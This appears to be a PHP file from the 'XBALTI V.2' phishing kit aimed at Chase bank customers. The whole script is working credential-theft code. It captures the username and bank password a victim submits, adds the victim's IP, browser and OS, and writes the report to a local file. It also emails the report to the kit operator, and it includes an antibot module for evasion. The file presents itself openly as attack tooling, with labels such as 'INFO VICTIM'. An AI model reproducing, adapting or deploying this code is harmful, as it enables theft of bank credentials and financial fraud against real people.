<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \  XBALTI   /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
$_SESSION['Username'] = $_POST['Username'];
$_SESSION['passbank'] = $_POST['passbank'] ;
$TIME_DATE = date('H:i:s d/m/Y');
include('Email.php');
include('get_browser.php');
include('get_ip.php');
include('../antibot.php');
$XBALTI_MESSAGE .= "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
------------------ <font style='color: #820000;'>E-MAIL BANK CHASE</font> ------------------<br/>
-_-_-_-_-_-_-_-_-[ <font style='color: #0a5d00;'>E-MAIL INFORMATION</font> ]-_-_-_-_-_-_-_-_-<br>
<font style='color:#9c0000;'>😈</font> [Username]   = <font style='color:#0070ba;'>".$_SESSION['Username']."</font><br>
<font style='color:#9c0000;'>😈</font> [Password]    = <font style='color:#0070ba;'>".$_SESSION['passbank']."</font><br>
-_-_-_-_-_-_-_-_-[ <font style='color: #0a5d00;'>INFO VICTIM</font> ]-_-_-_-_-_-_-_-_-<br>
<font style='color:#9c0000;'>😈</font> [IP INFO]      = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>😈</font> [TIME/DATE]    = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>😈</font> [BROWSER]      = <font style='color:#0070ba;'>".XBALTI_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XBALTI_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
------------------ <font style='color: #820000;'>BY XBALTI V.2</font> ------------------</div></html>\n";
    $khraha = fopen("../../1.php", "a");
	fwrite($khraha, $XBALTI_MESSAGE);
    $XBALTI_SUBJECT .= "NEW o_O ✪ O_o E-MAIL : ".$_SESSION['_ip_']." 😈 ".$_SESSION['Username']." 😈 ";
    $XBALTI_HEADERS .= "From: <XBALTIV2>";
    $XBALTI_HEADERS .= "XB-Version: 2.0\n";
    $XBALTI_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);

?>